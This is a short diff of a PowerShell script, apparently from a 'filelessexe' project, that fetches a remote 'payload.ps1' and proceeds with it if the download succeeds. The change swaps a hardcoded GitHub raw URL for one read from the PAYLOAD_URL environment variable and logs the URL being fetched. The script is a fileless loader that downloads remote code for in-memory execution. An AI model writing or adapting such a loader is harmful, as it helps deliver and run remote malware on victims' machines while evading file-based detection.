@@ -28,8 +28,9 @@ function E {
     }
 }
 
-Write-Host "[INFO] Fetching payload..."
-$u = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1"  
+$u = $env:PAYLOAD_URL  
+Write-Host "[INFO] Fetching payload from URL: $u"
+
 $p = F -u $u
 
 if ($p) {
@@ -40,4 +41,5 @@ if ($p) {
 else {
     Write-Host "[ERROR] Unable to proceed without a valid payload."
 }
+
 
